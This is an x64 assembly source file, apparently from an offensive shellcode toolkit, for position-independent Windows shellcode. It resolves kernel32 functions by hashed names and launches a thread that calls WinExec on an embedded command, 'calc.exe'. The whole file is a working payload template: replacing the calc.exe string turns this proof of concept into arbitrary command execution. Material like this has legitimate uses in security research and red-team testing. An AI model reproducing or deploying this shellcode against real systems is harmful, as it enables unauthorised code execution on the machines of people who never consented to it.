[ORG 0]
[BITS 64]

entry:
  ; store context
  push rbx                              ; store rbx
  cld                                   ; clear the direction flag

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; call "kernel32.dll, CreateThread"
  sub rsp, 32+5*8                       ; reserve stack for arguments
  mov rcx, 0x9D08BD6B4CE14AE2           ; set function hash
  mov rdx, 0x702824E783A5AC49           ; set hash key
  mov r8, 6                             ; set num arguments
  xor r9, r9                            ; lpThreadAttributes
  mov qword[rsp+32+0*8], 0              ; dwStackSize
  lea r10, [rbx+win_exec]               ; calculate function address
  mov [rsp+32+1*8], r10                 ; lpStartAddress
  mov [rsp+32+2*8], rbx                 ; lpParameter, set entry address
  mov qword [rsp+32+3*8], 0             ; dwCreationFlags
  mov qword [rsp+32+4*8], 0             ; lpThreadId
  call api_call                         ; call api function
  add rsp, 32+5*8                       ; restore stack for arguments

  ; call "kernel32.dll, WaitForSingleObject"
  mov rcx, 0x79A2580C6E2937E5           ; set function hash
  mov rdx, 0xA280D0DCE28F4296           ; set hash key
  mov r8, 2                             ; set num arguments
  mov r9, rax                           ; set thread handle
  mov r10, 1000                         ; set dwMilliseconds
  sub rsp, 32+1*8                       ; reserve stack
  mov [rsp+32+0*8], r10                 ; dwMilliseconds
  call api_call                         ; call api function
  add rsp, 32+1*8                       ; restore stack

  ; restore context
  pop rbx                               ; restore rbx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop rax                               ; get return address
  lea rbx, [rax-flag_CEA]               ; calculate entry address.
  push rax                              ; push return address
  ret                                   ; return to entry

win_exec:
  ; store context
  push rbx                              ; store rbx
  mov rbx, rcx                          ; read entry address from rcx
  cld                                   ; clear the direction flag

  ; call "kernel32.dll, WinExec"
  mov rcx, 0xCA2DBA870B222A04           ; set function hash
  mov rdx, 0xB725F01C80CE0985           ; set hash key
  mov r8, 2                             ; set num arguments
  lea r9, [rbx+command]                 ; lpCmdLine
  xor r10, r10                          ; clear r10
  mov r10b, [rbx+cmd_show]              ; uCmdShow
  sub rsp, 32+1*8                       ; reserve stack
  mov [rsp+32+0*8], r10                 ; uCmdShow
  call api_call                         ; call api function
  add rsp, 32+1*8                       ; restore stack

  ; restore context
  pop rbx                               ; restore rbx
  ret                                   ; exit thread

hash_api:
  %include "../../../src/x64/api_call.asm"

command:
  db "calc.exe", 0

cmd_show:
  db 1
